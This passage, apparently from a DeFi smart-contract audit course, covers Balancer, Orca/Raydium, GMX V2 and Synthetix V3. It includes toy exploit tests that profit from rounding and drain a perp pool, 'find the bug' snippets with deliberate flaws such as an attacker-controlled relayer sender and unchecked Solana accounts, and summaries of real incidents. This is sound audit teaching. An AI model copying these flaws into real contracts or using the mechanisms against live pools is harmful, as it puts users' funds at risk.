    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address BAL  = 0xba100000625a3754423978a60c9317c58a424e3D;

    function test_quoteVsSpot() public {
        (address[] memory toks, uint[] memory bal,) = vault.getPoolTokens(id);
        uint[] memory w = IWeighted(address(bytes20(id))).getNormalizedWeights();   // pool address = first 20 bytes of id
        emit log_named_uint("fee (1e18)", IWeighted(address(bytes20(id))).getSwapFeePercentage());
        // spot: BAL per WETH, token order is sorted by address so index 0 = BAL, 1 = WETH
        uint spot = (bal[0] * 1e18 / w[0]) * 1e18 / (bal[1] * 1e18 / w[1]);
        emit log_named_uint("spot BAL per WETH (1e18)", spot);

        address[] memory assets = new address[](2); assets[0] = WETH; assets[1] = BAL;
        IVault.Step[] memory s = new IVault.Step[](1);
        s[0] = IVault.Step(id, 0, 1, bal[1] / 100, "");                              // swap 1% of the pool's WETH
        int[] memory d = vault.queryBatchSwap(0, s, assets, IVault.Funds(address(this), false, address(this), false));
        emit log_named_int("WETH in", d[0]); emit log_named_int("BAL out", d[1]);
    }
}

Not run by me. The pool may have changed or been migrated, so adapt the id from the Balancer app. Compare BAL out / WETH in to spot: the gap is price impact plus the fee.

Exploit: rounding in the user's favour

Fixed-point pools round at every step. If a swap rounds in the trader's favour even by one unit, a loop of tiny swaps turns that into profit. The real incidents are more intricate, but the mechanism is the same. This toy pool shows it.

contract ToyPool {
    uint public rA = 1000; uint public rB = 1000;
    function swapAforB(uint a) external returns (uint b) {
        b = (rB * a + (rA + a) - 1) / (rA + a);        // ceil: rounds in the trader's favour (wrong)
        rA += a; rB -= b;
    }
    function swapBforA(uint b) external returns (uint a) {
        a = rA * b / (rB + b);                          // floor: correct
        rB += b; rA -= a;
    }
}
contract RoundingExploit is Test {
    function test_drift() public {
        ToyPool p = new ToyPool(); uint spent; uint got;
        for (uint i; i < 100; i++) { spent += 1; got += p.swapAforB(1); }   // pay 1, receive 1, 100 times
        uint back = p.swapBforA(got);                                        // sell the B back at the fair rounding
        emit log_named_uint("A spent", spent); emit log_named_uint("A back", back);
        assertGt(back, spent);                                               // 110 > 100: free money
        assertLt(p.rA() * p.rB(), 1000 * 1000);                              // invariant went down
    }
}

Trace: each 1-wei swap returns 1 B even though the price says 0.999 B, because ceil rounds up. After 100 steps the pool has 1,100 A and 900 B; selling 100 B back returns 110 A for a 10 A profit, and rA·rB fell from 1,000,000 to 990,000. Fix: round the output down and require(b > 0). Re-run and the test fails.

Step 5. Find the bug

// A. an integrator values BPT as collateral
uint price = IPool(bpt).getRate();                       // read inside a callback
// (no reentrancy check on the Vault)

// B. weighted math, out-given-in
uint power = base.powUp(exponent);
amountOut = balanceOut.mulUp(FixedPoint.ONE - power);

// C. a custom pool's onSwap
uint balanceIn = IERC20(tokenIn).balanceOf(address(vault));      // not the balance passed by the Vault

// D. integrator router
function swapFor(address user, SingleSwap memory s, uint limit) external {
    vault.swap(s, FundManagement(user, false, payable(msg.sender), false), limit, block.timestamp);
}

// E. a fork removes the ratio checks
// require(amountIn <= balanceIn * MAX_IN_RATIO / 1e18);   // deleted for "flexibility"
Answers
  1. A. Read-only reentrancy again (Lab 12). During exitPool with ETH the Vault's balances can be inconsistent with the BPT supply, so getRate or getPoolTokens returns a wrong value (Sentiment, April 2023, about $1M). Call VaultReentrancyLib.ensureNotInVaultContext(vault) before reading.
  2. B. Rounding direction is inverted. power should round up and the final multiply should round down, so the pool never pays out more than the maths allows. Every function in WeightedMath chooses up/down deliberately; check each against "who benefits".
  3. C. The Vault's balance of a token includes every other pool's funds and any donation. A pool must use only the balances the Vault passes in.
  4. D. The sender in FundManagement is attacker-controlled. Anyone who approved this router as a relayer gets drained, because the Vault will accept the relayer acting for user. Sender must be msg.sender, and the recipient the user's choice.
  5. E. The 30% ratios keep inputs inside the range where LogExpMath is accurate. Outside it the approximation error can exceed the fee and the rounding bounds, so one oversized swap or a sequence of them can extract value.

Step 6. Study material

  • Balancer V2, November 2025 (roughly $100M+): an exploit of stable-pool maths involving rounding and precision at tiny amounts across a batched swap, which manipulated the pool's invariant and BPT price. Read the post-mortems, then reproduce the mechanism in a toy model like ToyPool. The figure is from memory.
  • Sentiment, April 2023 (~$1M): read-only reentrancy through the Vault, valued LP collateral wrongly. Compare with Conic in Lab 12.
  • Balancer V1, June 2020 (~$0.5M): a deflationary token (burn on transfer) plus flash loans drained pools whose accounting assumed the transferred amount arrived in full. Link to M1 Bug 5.
  • Read the Balancer V2 audits (several firms) and sort findings: math, Vault, reentrancy, token behaviour.

Step 7. Balancer checklist

  • Rounding direction of every operation: swaps, joins, exits, fee computations, scaling up and down by decimals and rates.
  • Behaviour with extreme or tiny amounts, boundary values (1 wei, 30% ratio, equal weights, dust balances).
  • Pools read only Vault-supplied balances; invariants recomputed from them.
  • Reentrancy: Vault guard coverage, ETH sends, view functions that expose transient state.
  • Relayer and approval model: sender binding, who can be an approved relayer, what a relayer can do.
  • Token weirdness: fee-on-transfer, rebasing, tokens with hooks; rate providers that can be manipulated.
  • Admin: Authorizer roles, swap-fee bounds, pausing, managed-pool powers, recovery mode.
  • Integrators: BPT valuation method, oracle use, slippage limits and deadlines on every call.
Lab 13 deliverable(1) With the calculator, compare price impact for the same trade in a 50/50 and a 98/2 pool of equal total value. (2) Run test_drift, apply the rounding fix, show the test failing. (3) Write a finding in the Lab 1 format for snippet D.

Lab 14. Solana AMMs: Orca Whirlpools and Raydium

In plain wordsThe same ideas as V3 and V2, on Solana, where liquidity data lives in separate accounts the caller must pass in. Bugs are mostly about checking those accounts.

Key terms: tick array, position NFT, Q64.64. See the glossary at the end.

Orca Whirlpools and Raydium CLMM are Uniswap V3's idea (Lab 10) rebuilt on Solana's account model (Lab 6). The maths barely changes. What changes is where the data lives and who proves it is the right data: ticks do not sit in a contract's storage mapping, they sit in separate TickArray accounts that the caller must pass in, and positions are tracked by NFTs. Raydium also has two older/simpler designs: CPMM (constant product, Anchor) and AMM v4 (constant product that also places orders on the OpenBook order book).

Step 1. What changes from V3 (EVM) to Whirlpools (Solana)

Uniswap V3Orca Whirlpools / Raydium CLMM
PricesqrtPriceX96 (Q64.96, uint160)sqrt_price Q64.64 (u128)
TicksMapping inside the poolFixed-size TickArray accounts (88 ticks each in Orca); PDA seeded by pool and start index
Swap inputFunction argumentsThe caller supplies up to 3 tick arrays covering the price path; the swap fails if the path leaves them
PositionKeyed by owner and ticks (NFT via periphery)A Position account plus a position NFT mint; the NFT holder controls it
CallbacksPool calls back the callerNo callback; the instruction does token transfers by CPI, so authority is checked on accounts
LimitsGasCompute units and account count per transaction
Fee wrap-aroundunchecked in Soliditywrapping_sub in Rust (overflow checks would panic)

Step 2. Follow the numbers

Decimals and the price. SOL (9 decimals) against USDC (6). Raw price is USDC-units per SOL-unit: $150 per SOL = 150e6 / 1e9 = 0.15. The displayed price is (sqrt_price / 2^64)^2 · 10^(9−6). So sqrt_price ≈ √0.15 · 2^64 ≈ 7.14e18. Forgetting the decimal factor is the classic UI and oracle bug.

Ticks. tick = ln(0.15) / ln(1.0001) ≈ −18,972. With tick spacing 64 the nearest initializable tick below is floor(−18,972 / 64) · 64 = −19,008.

Tick arrays. Each array covers 88 spacings: 88 · 64 = 5,632 ticks. Start index = floor(tick / 5,632) · 5,632 = floor(−3.37) · 5,632 = −22,528. Buying SOL (price rises) needs arrays starting at −22,528, −16,896 and −11,264. Selling SOL (price falls) needs −22,528, −28,160 and −33,792. A swap wider than three arrays has to be split across transactions.

Fees. Orca stores the fee rate in millionths (3000 = 0.30%). Swapping 10 SOL in: fee = 0.03 SOL. If the protocol takes 13% (illustrative), 0.0039 SOL goes to the protocol and 0.0261 SOL to LPs, which adds 0.0261 · 2^64 / liquidity to the global fee-growth counter.

Raydium CPMM. Plain constant product with a pool config of fee rates (denominator 1,000,000). It supports Token-2022 tokens that charge a transfer fee, so the program must compute the amount that actually arrives, like fee-on-transfer tokens in Lab 9.

Step 3. Play with it

Step 5. Hands-on: read a live pool account

Fetch the raw account of a Whirlpool, prove its owner is the program, and decode the price yourself. This is the Lab 6 owner check applied for real.

// read.ts   (npm i @solana/web3.js tsx;   run: npx tsx read.ts)
import { Connection, PublicKey } from "@solana/web3.js";
const c = new Connection("https://api.mainnet-beta.solana.com");
const WHIRLPOOL_PROGRAM = new PublicKey("whirLbMiicVdio4qvUfM5KAg6Ct8VwpYzGff3uctyCc");
const POOL = new PublicKey("HJPjoWUrhoZzkNfRpHuieeFk9WcZWjwy6PBjZ81ngndJ");   // SOL/USDC; verify on the Orca app

const info = await c.getAccountInfo(POOL);
console.log("owned by Whirlpool program:", info!.owner.equals(WHIRLPOOL_PROGRAM), "bytes:", info!.data.length);

const dv = new DataView(info!.data.buffer, info!.data.byteOffset);
const u128 = (o: number) => (dv.getBigUint64(o + 8, true) << 64n) | dv.getBigUint64(o, true);
// offsets follow state/whirlpool.rs: 8 discriminator, 32 config, 1 bump, u16 spacing, 2 seed, u16 fee, u16 protocol fee, u128 liquidity, u128 sqrt_price, i32 tick
const spacing = dv.getUint16(41, true), fee = dv.getUint16(45, true);
const liquidity = u128(49), sqrt = u128(65), tick = dv.getInt32(81, true);
const ratio = Number(sqrt) / 2 ** 64;
console.log({ spacing, fee, liquidity, tick, priceSolInUsdc: ratio * ratio * 1e3 });

Not run by me. The field offsets must match state/whirlpool.rs in the version deployed; if the numbers look wrong, re-derive them from the struct. The decoded tick should be near the tick your calculator gives for the current SOL price, and tick / spacing should locate the tick array you would pass to a swap.

Experiments (1) Derive the three PDAs for the tick arrays around the current tick using seeds ["tick_array", pool, start_index_as_string] and fetch them. (2) For the same pool compute how many initialized ticks a 1,000,000 USDC swap would cross. (3) In the Raydium CPMM repo, trace a swap with a Token-2022 mint that has a transfer fee and write the exact amount that reaches the vault.

Step 6. Find the bug

// A. claim fees
pub tick_array_lower: AccountInfo<'info>,        // data parsed by hand, owner and seeds never checked
let tick = TickArray::try_deserialize(&mut &ctx.accounts.tick_array_lower.data.borrow()[..])?;

// B. fee growth
let inside = global.checked_sub(below)?.checked_sub(above)?;    // Rust, overflow-checks on

// C. close_position
require!(ctx.accounts.position_token_account.amount == 1);       // mint and owner of that account not checked
ctx.accounts.position.close(ctx.accounts.receiver.to_account_info())?;

// D. admin instruction
pub admin: AccountInfo<'info>,
require_keys_eq!(ctx.accounts.admin.key(), pool.admin);          // no Signer

// E. tick array validation
require!(start_tick_index % TICK_ARRAY_SIZE == 0);               // missing the tick-spacing factor
Answers
  1. A. Crema Finance, July 2022 (about $8.8M): a fake tick account with forged fee data was accepted because ownership and PDA seeds were not verified; the attacker claimed fees against it with a flash loan. Use typed Account<TickArray> or check owner and the PDA derivation from the pool and start index.
  2. B. Fee-growth counters are supposed to wrap. A checked subtraction panics when a counter wrapped, so affected positions can never collect fees or close: DoS, funds stuck. Use wrapping_sub (Lab 10, bug A).
  3. C. The program must check the token account's mint equals position.position_mint and that its owner is the signer. Otherwise anyone holding any NFT-like token with amount 1 can close someone else's position and take its rent or liquidity.
  4. D. Comparing a key does not prove approval: add Signer (Lab 6, bug 1). The December 2022 Raydium incident (about $4.4M) was different in cause but the same class of risk: a privileged pool-owner key was compromised and used to withdraw pool fees. Admin keys need multisig, timelock and minimal powers.
  5. E. The start index must be a multiple of 88 · tick_spacing, not 88. Otherwise arrays can overlap, and one tick can be counted twice or skipped, corrupting liquidity and fee maths.

Step 7. Study material

  • Crema Finance, July 2022: read the post-mortem. Rewrite the vulnerable instruction's account list and mark which constraint would have stopped the attack.
  • Raydium, December 2022: read the incident report on the compromised admin key and the follow-up on key management. Write down which on-chain controls (multisig, timelock, per-instruction limits) would have reduced the loss.
  • Compute-unit griefing: an attacker initializing many dust positions spaced one tick apart forces swaps through many initialized ticks, hitting the compute limit. Find how each program limits ticks crossed, arrays per swap and partial fills, and what a user can still do when a swap fails this way.
  • Read the public audit reports for Whirlpools and Raydium and sort findings into: account validation, math rounding, fee/reward accounting, admin.

Step 8. Checklist

  • Every account: signer, writable, owner, discriminator, seeds or stored key. Especially tick arrays, oracle, vaults, position token account and mint.
  • Swap: other_amount_threshold enforced in the right direction, sqrt_price_limit bounded and consistent with the direction, input/output exact-in versus exact-out handled.
  • Fixed-point: Q64.64 conversions, 256-bit intermediates, rounding direction when adding (up) and removing (down) liquidity.
  • Fee and reward accounting wraps where intended and cannot be claimed twice; checkpoints updated before liquidity changes.
  • Positions: NFT mint and ownership tie to the position account, burn or close paths cannot be spoofed.
  • Token-2022: transfer fees, hooks, freeze or permanent-delegate extensions handled or rejected.
  • Compute and account limits: behaviour when the price path leaves the supplied arrays or crosses many ticks.
  • Admin: who can change fees, withdraw protocol fees or reconfigure; key management and upgrade authority.
  • AMM v4: OpenBook account validation, PnL accounting, funds sitting in open orders.
Lab 14 deliverable(1) Run read.ts, confirm the owner check, decode the tick and compute the tick array start; attach the output. (2) Write the account-validation table (Lab 6 format) for the Orca swap instruction. (3) Write a finding in the Lab 1 format for snippet C.

Stage 5: Perpetual futures and synthetics

About 10 hours of study · needs: Stage 4 (oracles, price impact) and Stage 2

Theory in plain words

A perpetual future is a leveraged bet on a price with no expiry. The trader posts margin and gets exposure many times larger. A regular funding payment between longs and shorts pulls the contract price toward the real price. In the protocols here the counterparty is a pool of liquidity providers, so a trader's profit is the pool's loss: the system is zero-sum before fees.

Safety rests on three things: an honest price at the exact moment of each trade (hence signed oracle prices and delayed settlement), enough pool value to pay winners (reserve and cap limits), and closing losing positions before they go negative (liquidation). Anything that lets someone trade at a price they could see before the protocol did, or that hides losses from the pool's value, moves money from liquidity providers to traders.

Check yourself before moving on
  1. Why can a perpetual pool lose money to traders on average, not just by accident?
  2. What risk does a reserve limit remove?

Lab 15. GMX V2 (perpetuals)

In plain wordsGMX V2 lets traders take leveraged long or short positions against a pool of liquidity providers; when traders win, the pool loses. Keepers execute orders at signed oracle prices. Auditing means keeping the pool solvent and its price honest.

Key terms: perpetual, GM token, funding, open interest. See the glossary at the end.

Everything so far was spot trading or lending. A perpetual swap is a bet on a price with leverage, and the counterparty is not another trader but a pool of liquidity providers. GMX V2 is the clearest example: LPs deposit into a GM pool (one per market, e.g. ETH/USD backed by WETH and USDC); traders open leveraged long or short positions against it; when traders win in total, the pool loses, and vice versa. The audit problems are all about keeping that pool solvent and its price honest.

Step 1. The cast

PieceRole
Market(index token, long token, short token). The index token only supplies the price and need not be held. Market token = GM, the LP share.
DataStoreOne key-value contract holding almost all state (positions, open interest, pool amounts, parameters). Logic contracts read and write it by key.
RoleStoreWho may do what: controller, keeper, config roles.
Router / ExchangeRouterUser entry points: create deposit, withdrawal, order. Funds go to vaults.
HandlersOrderHandler, DepositHandler, WithdrawalHandler, LiquidationHandler, AdlHandler: execute requests.
KeepersOff-chain bots that execute requests with signed oracle prices.
OracleValidates signed min/max prices for a block or timestamp range.

Two-step design. A user only creates an order (with a price limit and an execution fee). A keeper later executes it with oracle prices taken after the order's creation time. The user cannot pick the price, and nobody can sandwich the order: that is what replaces the slippage-and-mempool game of AMMs.

Step 2. The maths

Position        sizeInUsd, sizeInTokens = sizeInUsd / entryPrice, collateral
PnL (long)      sizeInTokens · price − sizeInUsd
PnL (short)     sizeInUsd − sizeInTokens · price
Leverage        sizeInUsd / (collateral + PnL − fees)
Liquidation     collateral + PnL − fees < minCollateralFactor · sizeInUsd
Pool value      Σ pool tokens · price  −  net trader PnL  (+ pending fees, impact pool)
GM price        pool value / GM supply
Price impact    f · (imbalance_before^e − imbalance_after^e)    imbalance = |longOI − shortOI|
Funding         larger side (by open interest) pays the smaller side, rate grows with imbalance
Borrowing fee   paid by traders to LPs, grows with pool utilization (reserved / pool)

Worked position. ETH = $2,000. Trader posts $1,000 USDC and opens a 10× long: size = $10,000, tokens = 5 ETH. Open fee at 0.06% = $6.

ETH pricePnLCollateral leftNote
2,2005 · 2,200 − 10,000 = +1,0002,000+100% on collateral
1,8509,250 − 10,000 = −75025040× effective leverage
1,8209,100 − 10,000 = −900100 = 1% of sizeliquidation (ignoring fees, funding)

Pool side. Pool holds 1,000 ETH and 2,000,000 USDC at $2,000: value $4,000,000, GM supply 4,000,000, so GM = $1.0000. If traders are net +$1,000, pool value is 3,999,000 and GM = $0.99975. GM must reflect unrealized trader PnL, or LPs can withdraw at an inflated price just before losses are realized.

Price impact (illustrative). Long OI 5,000,000, short OI 4,000,000, imbalance 1,000,000. A new $500,000 long raises it to 1,500,000. With e = 2 and f = 2e-9: cost = 2e-9 · (1.5e6² − 1e6²) = $2,500 (0.5% of the order). A short of the same size would shrink the imbalance and earn a positive impact.

Solvency controls. Reserve factor: the amount of pool assets that must back open positions' possible profit may not exceed a share of the pool. Max PnL factor: if trader profit would exceed a share of the pool, auto-deleveraging (ADL) lets keepers force-reduce the most profitable positions. Open-interest caps and min collateral bound the rest.

Step 3. Play with it

Step 4. Read the code

Do this 
git clone https://github.com/gmx-io/gmx-synthetics && cd gmx-synthetics/contracts
ls exchange order position market oracle pricing
Paths from memory; confirm.
ReadLook for

Rule that explains much of the design: use the price that is worse for the trader or depositor. Longs increasing use the max price, longs decreasing use the min. Rounding follows the same principle.

Step 5. Hands-on: a toy perp pool

No fork needed. This model has the essential flaw of a perp pool with no solvency controls: a trader can open a position whose profit exceeds what the pool can pay.

contract ToyPerp {                                    // USDC pool, long-only, owner-set ETH price
    uint public pool; uint public price = 2000;
    struct Pos { uint size; uint tokens; uint collateral; }
    mapping(address => Pos) public pos;
    function lpDeposit(uint a) external { pool += a; }
    function setPrice(uint p) external { price = p; }
    function open(uint size, uint collateral) external {
        pos[msg.sender] = Pos(size, size / price, collateral);
        pool += collateral;                                // pool holds trader collateral
    }
    function close() external returns (uint payout) {
        Pos memory p = pos[msg.sender]; delete pos[msg.sender];
        int out = int(p.collateral) + int(p.tokens * price) - int(p.size);
        payout = out > 0 ? uint(out) : 0;
        if (payout > pool) payout = pool;                   // pool cannot pay more than it has
        pool -= payout;
    }
}
contract PerpTest is Test {
    function test_lpsWiped() public {
        ToyPerp t = new ToyPerp(); t.lpDeposit(100_000);                // LPs put in 100,000
        t.open(1_000_000, 100_000);                                     // 10x long, size 1,000,000
        t.setPrice(4000);                                               // price doubles
        uint paid = t.close();
        emit log_named_uint("trader paid", paid); emit log_named_uint("pool left", t.pool());
        assertEq(t.pool(), 0);                                          // LPs lost their whole deposit
    }
}

Run it: the trader's true profit is $1,000,000 but the pool only had $200,000 (LP money plus the trader's own collateral), so the pool is emptied and LPs lose everything. Now add GMX-style controls to open:

uint public reserved;
function open(uint size, uint collateral) external {
    require(reserved + size <= pool * 90 / 100, "reserve exceeded");   // max possible payout must fit in the pool
    require(size <= collateral * 20, "leverage");
    reserved += size; ...
}
// and in close(): reserved -= p.size; cap profit at p.size (max PnL factor)

Re-run: open now reverts for the oversized position. Real GMX sizes the reserve by position tokens, caps profit with the max PnL factor, and uses ADL when the cap is reached; the toy shows why each exists.

Step 6. Find the bug

// A. execute an increase order
position.sizeInUsd += order.sizeDeltaUsd;                       // order.acceptablePrice never compared to execution price

// B. short position opening
uint sizeInTokens = sizeDeltaUsd / executionPrice;              // round down, for shorts too

// C. GM price
uint poolValue = longTokenAmt * longPrice + shortTokenAmt * shortPrice;
uint gmPrice = poolValue * 1e18 / gmSupply;                    // no trader PnL, no pending fees

// D. execute order
if (order.callbackContract != address(0)) IOrderCallback(order.callbackContract).afterOrderExecution(...);
DataStore.setPosition(...);                                    // state written after the external call

// E. oracle
require(signaturesValid(prices));                               // timestamps of prices never compared to order.updatedAtTime
Answers
  1. A. Without the acceptable price check the order fills at whatever the keeper's price is, so a delay or volatile move hurts the user. Compare the execution price with the limit in the right direction for long/short and increase/decrease.
  2. B. For a short, PnL = size − tokens · price, so fewer tokens means a larger PnL: rounding down favours the trader. Shorts must round sizeInTokens up; longs round down. Rounding must always favour the pool.
  3. C. GM must subtract the traders' net unrealized profit (and include pending fees and the impact pool). Otherwise when traders are winning, GM is overpriced: an LP can withdraw at the inflated price and leave the remaining LPs holding the loss when profits are realized.
  4. D. A callback hands control to an arbitrary contract before the position and pool state are final. This is the reentrancy shape behind the July 2025 GMX V1 exploit (roughly $40M, mostly returned): a re-entrant call manipulated global position data while the system was inconsistent. Write state first, call external code last, bound callback gas.
  5. E. A valid signature on an old price lets a keeper or attacker choose the most favourable historical price. Prices must be from after the order's last update time, within a bounded range, and consistent across tokens.

Step 7. Study material

  • GMX V1, July 2025 (roughly $40M, most returned for a bounty): read the post-mortem. Identify the exact state variable manipulated and why V2's design (keeper-executed orders, no direct GLP-style average price) addresses it, and what remains.
  • Mango Markets, October 2022: perp-like positions plus a thin oracle. Compare with GMX's oracle model (signed prices, deep reference markets).
  • Read the GMX V2 audits and public contest reports; sort findings into: pool accounting, price impact and fee maths, oracle and keeper trust, order execution flow.
  • Write the "who can lose money when the oracle is off by 1%" table for traders, LPs and the protocol.

Step 8. Perp checklist

  • Pool solvency: reserve checks, max PnL, ADL conditions, open-interest caps; what happens at the limit.
  • GM or LP token pricing includes unrealized PnL, fees and impact pool; deposits and withdrawals use consistent min/max prices; sandwiching deposits around price updates.
  • Rounding: favours the pool in every PnL, size, fee and impact calculation; sign handling for negative values.
  • Funding and borrowing fees accrue before any position or pool change; signs and directions correct; no way to avoid fees by splitting or closing within a block.
  • Liquidation: threshold includes fees, funding, impact; can a position be made un-liquidatable (reverting collateral token, callback, dust)?
  • Oracle: signer set, timestamp window, min/max logic, per-token validity, latency arbitrage (stale prices versus a fast market).
  • Keeper trust: what a malicious or lagging keeper can do; ordering and skipping of orders; execution fee refunds.
  • Reentrancy and callbacks: token hooks, native ETH sends, callback contracts and their gas limits.
  • Config and DataStore: key collisions, who can write which keys, parameter bounds so no single change makes the pool insolvent.
Lab 15 deliverable(1) With the calculator, find the liquidation price for a 25× short at 2,000 with 0.5% min collateral and verify by hand. (2) Run test_lpsWiped, add the reserve and leverage checks, show the open reverting. (3) Write a finding in the Lab 1 format for snippet C (GM price without trader PnL).

Lab 16. Synthetix V3

In plain wordsSynthetix V3 spreads the gains and losses of its markets across all liquidity providers in a pool. Your debt is what you minted plus your share of the pool's debt, so debt must be brought up to date before any action.

Key terms: debt pool, skew, collateral ratio. See the glossary at the end.

Synthetix V3 is a shared debt engine. Liquidity providers deposit collateral and delegate it to a pool; the pool backs one or more markets (perps, spot, others); when a market's traders win, the market owes the system, and that debt is spread across the pool's LPs. LPs can also mint snxUSD against their collateral. So an LP's real debt is what they minted plus their share of the pool's market debt, and the collateral ratio is measured against that total. Most V3 bugs are about getting this debt accounting, and the oracle prices behind it, exactly right at every moment.

Step 1. The cast

PieceRole
CoreProxy and modulesThe core system: accounts, collateral, vaults, pools, markets, USD issuance, liquidations, rewards.
Account (NFT) and permissionsPositions belong to an account id. Roles such as ADMIN, DELEGATE, MINT, WITHDRAW are granted per address, so authorization is by permission, not just by owner.
Collateral configurationPer collateral type: issuanceRatio (minimum c-ratio to mint), liquidationRatio, liquidation reward, oracle node, deposit limit, minimum delegation.
VaultOne per (pool, collateral type): the delegated collateral and the debt distribution (shares and value per share).
PoolOwner-configured list of markets with weights and per-market debt caps.
MarketExternal contract registered with core. It reports its debt, can draw credit from pools (withdrawMarketUsd) and pays back (depositMarketUsd).
Oracle managerA graph of nodes (Pyth, Chainlink, reducers, staleness circuit breakers) evaluated to a price.
Perps marketSkew-priced perpetuals with asynchronous orders settled against a Pyth price from a specific time.

Step 2. The maths

C-ratio            collateral value / debt         (debt = minted snxUSD + share of pool debt)
Mint allowed       c-ratio ≥ issuanceRatio          Liquidatable: c-ratio < liquidationRatio
Debt distribution  each vault holds shares s_i and a running value-per-share v;
                   debt_i = s_i · v        a new market loss L raises v by L / Σs
Skew               skew = longSize − shortSize      (net open interest)
Fill price         P · (1 + (skew_before + skew_after) / (2 · skewScale))     (average premium over the trade)
Fees               maker fee if the trade reduces |skew|, taker fee if it increases it
Funding            rate velocity ∝ skew / skewScale, rate integrates over time; larger side pays

Worked debt sharing. LP A delegates 100 ETH ($200,000 at $2,000), LP B delegates 50 ETH ($100,000), same pool and vault. Shares: A 2/3, B 1/3. A has minted 40,000 snxUSD.

  • Traders in the perps market net win $30,000: market debt +30,000, shared 2:1, so A takes $20,000 and B $10,000.
  • A's debt = 40,000 + 20,000 = 60,000; collateral $200,000, c-ratio 333%.
  • ETH falls to $1,000: collateral $100,000 / 60,000 = 167%. With a liquidation ratio of 150% (illustrative) A is close to liquidation; below that, anyone can liquidate.

Skew pricing. Oracle ETH $2,000, skewScale 1,000,000 ETH, skew +10,000 ETH (longs heavy). A trader buys 100 ETH: fill = 2,000 · (1 + (10,000 + 10,100) / 2,000,000) = 2,020.10, a 1.005% premium (cost $202,010 against $200,000). Selling 100 ETH instead reduces skew to 9,900 and fills at 2,019.90. There is no order book: the premium itself is the price impact, and LPs (who take the opposite side) earn it.

Asynchronous orders. A trader commits an order; after a settlement delay a keeper settles it using the Pyth price at commitTime + delay (inside a time window). This removes the old Synthetix V2 problem where bots front-ran stale Chainlink prices: the trader cannot choose the price after seeing it.

Step 3. Play with it

Step 4. Read the code
